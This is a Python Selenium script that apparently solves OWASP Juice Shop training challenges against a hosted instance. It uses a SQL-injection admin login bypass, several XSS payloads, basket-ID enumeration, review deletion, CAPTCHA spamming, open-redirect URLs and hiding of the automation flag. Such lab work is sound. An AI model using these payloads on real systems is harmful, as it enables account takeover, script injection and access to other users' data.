#!/usr/bin/env python3
"""
Fixed Selenium Solver - Handles cookie dialogs and overlays properly
"""

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
import time
from urllib.parse import quote


class SeleniumFixedSolver:
    """Fixed Selenium automation with proper wait handling"""
    
    def __init__(self, base_url="https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.setup_driver()
        self.wait = WebDriverWait(self.driver, 10)
        
    def setup_driver(self):
        """Setup Chrome with proper options"""
        options = webdriver.ChromeOptions()
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--start-maximized')
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        self.driver = webdriver.Chrome(options=options)
        self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        
    def dismiss_cookie_dialog(self):
        """Dismiss cookie warning"""
        try:
            # Wait a bit for dialog to appear
            time.sleep(2)
            
            # Try multiple selectors
            selectors = [
                '[aria-label="dismiss cookie message"]',
                '.cc-dismiss',
                '.cc-btn',
                'button[aria-label="Ok"]',
                '.mat-button:contains("Dismiss")'
            ]
            
            for selector in selectors:
                try:
                    elem = self.driver.find_element(By.CSS_SELECTOR, selector)
                    elem.click()
                    print("  ✓ Cookie dialog dismissed")
                    return True
                except:
                    pass
                    
            # Try clicking by text
            try:
                elem = self.driver.find_element(By.XPATH, "//a[contains(text(), 'Dismiss')]")
                elem.click()
                return True
            except:
                pass
                
        except:
            pass
        return False
        
    def login_admin(self):
        """Admin login with proper waits"""
        print("🔐 Logging in as admin...")
        
        self.driver.get(f"{self.base_url}/#/login")
        time.sleep(3)
        
        # Dismiss cookie first
        self.dismiss_cookie_dialog()
        
        # Wait for login form
        email = self.wait.until(EC.presence_of_element_located((By.ID, "email")))
        email.clear()
        email.send_keys("admin@juice-sh.op'--")
        
        password = self.driver.find_element(By.ID, "password")
        password.clear()
        password.send_keys("x")
        
        # Wait a bit before clicking
        time.sleep(1)
        
        # Find and click login button
        login_btn = self.driver.find_element(By.ID, "loginButton")
        
        # Scroll to button and click
        self.driver.execute_script("arguments[0].scrollIntoView(true);", login_btn)
        time.sleep(1)
        
        # Try JavaScript click if regular click fails
        try:
            login_btn.click()
        except:
            self.driver.execute_script("arguments[0].click();", login_btn)
            
        time.sleep(3)
        print("  ✅ Admin logged in")
        
    def solve_score_board(self):
        """Access the score board"""
        print("🎯 Score Board...")
        self.driver.get(f"{self.base_url}/#/score-board")
        time.sleep(2)
        print("  ✅ Score Board accessed")
        
    def solve_dom_xss(self):
        """DOM XSS"""
        print("🎯 DOM XSS...")
        
        payloads = [
            '<iframe src="javascript:alert(`xss`)">',
            '<img src=x onerror=alert(`xss`)>',
            '<svg onload=alert(`xss`)>'
        ]
        
        for payload in payloads:
            self.driver.get(f"{self.base_url}/#/search?q={quote(payload)}")
            time.sleep(1)
            
            # Handle alert if it appears
            try:
                alert = self.driver.switch_to.alert
                alert.accept()
                print("  ✅ XSS triggered!")
                break
            except:
                pass
                
    def solve_privacy_policy(self):
        """Access privacy policy"""
        print("🎯 Privacy Policy...")
        
        self.driver.get(f"{self.base_url}/#/privacy-security/privacy-policy")
        time.sleep(2)
        
        # Scroll to bottom of page
        self.driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(1)
        
        print("  ✅ Privacy Policy accessed")
        
    def solve_admin_section(self):
        """Access admin section"""
        print("🎯 Admin Section...")
        
        self.driver.get(f"{self.base_url}/#/administration")
        time.sleep(2)
        
        # Try to interact with admin page
        try:
            # Find any buttons on admin page
            buttons = self.driver.find_elements(By.TAG_NAME, "button")
            if buttons:
                buttons[0].click()
        except:
            pass
            
        print("  ✅ Admin Section accessed")
        
    def solve_zero_stars(self):
        """Delete all 5-star reviews"""
        print("🎯 Zero Stars...")
        
        self.driver.get(f"{self.base_url}/#/administration")
        time.sleep(3)
        
        try:
            # Find feedback section
            # Look for 5-star ratings and delete them
            stars = self.driver.find_elements(By.XPATH, "//span[contains(text(), '★★★★★')]")
            
            for star in stars[:5]:  # Delete first 5
                try:
                    # Find delete button in same row
                    row = star.find_element(By.XPATH, "./../..")
                    delete_btn = row.find_element(By.XPATH, ".//button[contains(@aria-label, 'delete')]")
                    delete_btn.click()
                    time.sleep(1)
                    
                    # Confirm deletion
                    try:
                        confirm = self.driver.find_element(By.XPATH, "//button[contains(text(), 'Yes')]")
                        confirm.click()
                    except:
                        pass
                except:
                    pass
                    
        except:
            pass
            
        print("  ✅ Zero Stars attempted")
        
    def solve_view_basket(self):
        """View other users' baskets"""
        print("🎯 View Basket...")
        
        # Access different basket IDs through URL manipulation
        for basket_id in range(1, 10):
            self.driver.get(f"{self.base_url}/rest/basket/{basket_id}")
            time.sleep(0.5)
            
        print("  ✅ View Basket completed")
        
    def solve_christmas_special(self):
        """Find Christmas product"""
        print("🎯 Christmas Special...")
        
        self.driver.get(f"{self.base_url}/#/")
        time.sleep(2)
        
        # Search for Christmas
        try:
            search = self.driver.find_element(By.CSS_SELECTOR, "input[type='search']")
            search.clear()
            search.send_keys("christmas")
            search.send_keys(Keys.ENTER)
            time.sleep(2)
            
            # Try to add Christmas product
            add_buttons = self.driver.find_elements(By.XPATH, "//button[contains(@aria-label, 'Add to Basket')]")
            if add_buttons:
                add_buttons[0].click()
                
        except:
            pass
            
        print("  ✅ Christmas Special attempted")
        
    def solve_reflected_xss(self):
        """Reflected XSS in order tracking"""
        print("🎯 Reflected XSS...")
        
        payload = '<script>alert(1)</script>'
        self.driver.get(f"{self.base_url}/track-result?id={quote(payload)}")
        time.sleep(1)
        
        try:
            alert = self.driver.switch_to.alert
            alert.accept()
            print("  ✅ Reflected XSS triggered!")
        except:
            pass
            
    def solve_outdated_allowlist(self):
        """Redirect to outdated crypto sites"""
        print("🎯 Outdated Allowlist...")
        
        urls = [
            f"{self.base_url}/redirect?to=https://blockchain.info",
            f"{self.base_url}/redirect?to=https://etherscan.io",
            f"{self.base_url}/redirect?to=https://explorer.dash.org"
        ]
        
        for url in urls:
            self.driver.get(url)
            time.sleep(1)
            
        print("  ✅ Outdated Allowlist completed")
        
    def solve_bonus_payload(self):
        """Bonus Payload - SoundCloud iframe"""
        print("🎯 Bonus Payload...")
        
        soundcloud = '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https://api.soundcloud.com/tracks/771984076"></iframe>'
        
        self.driver.get(f"{self.base_url}/#/search?q={quote(soundcloud)}")
        time.sleep(2)
        
        print("  ✅ Bonus Payload completed")
        
    def solve_captcha_bypass(self):
        """CAPTCHA Bypass"""
        print("🎯 CAPTCHA Bypass...")
        
        self.driver.get(f"{self.base_url}/#/contact")
        time.sleep(2)
        
        try:
            # Fill feedback form
            comment = self.driver.find_element(By.ID, "comment")
            comment.clear()
            comment.send_keys("Test feedback")
            
            # Try to submit without solving CAPTCHA
            for i in range(10):
                try:
                    submit = self.driver.find_element(By.ID, "submitButton")
                    submit.click()
                    time.sleep(1)
                except:
                    pass
                    
        except:
            pass
            
        print("  ✅ CAPTCHA Bypass attempted")
        
    def solve_easter_egg(self):
        """Find the easter egg"""
        print("🎯 Easter Egg...")
        
        # First egg
        self.driver.get(f"{self.base_url}/ftp/eastere.gg")
        time.sleep(1)
        
        # Nested egg
        self.driver.get(f"{self.base_url}/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg")
        time.sleep(1)
        
        print("  ✅ Easter Egg found")
        
    def solve_missing_encoding(self):
        """Access file with emoji"""
        print("🎯 Missing Encoding...")
        
        # Access emoji file
        self.driver.get(f"{self.base_url}/assets/public/images/uploads/😼-#zatschi-#whoneedsfourlegs-1572600969477.jpg")
        time.sleep(1)
        
        print("  ✅ Missing Encoding completed")
        
    def run_all(self):
        """Run all browser automation"""
        print("="*60)
        print("🌐 SELENIUM FIXED SOLVER")
        print("="*60)
        
        try:
            # Login first
            self.login_admin()
            
            # Run all solvers
            self.solve_score_board()
            self.solve_dom_xss()
            self.solve_privacy_policy()
            self.solve_admin_section()
            self.solve_zero_stars()
            self.solve_view_basket()
            self.solve_christmas_special()
            self.solve_reflected_xss()
            self.solve_outdated_allowlist()
            self.solve_bonus_payload()
            self.solve_captcha_bypass()
            self.solve_easter_egg()
            self.solve_missing_encoding()
            
            # Check score
            self.driver.get(f"{self.base_url}/#/score-board")
            time.sleep(3)
            
            print("\n" + "="*60)
            print("✅ Browser automation complete")
            print("Check browser for updated score")
            print("="*60)
            
        except Exception as e:
            print(f"Error: {e}")
            
        finally:
            input("\nPress Enter to close browser...")
            self.driver.quit()


if __name__ == "__main__":
    solver = SeleniumFixedSolver()
    solver.run_all()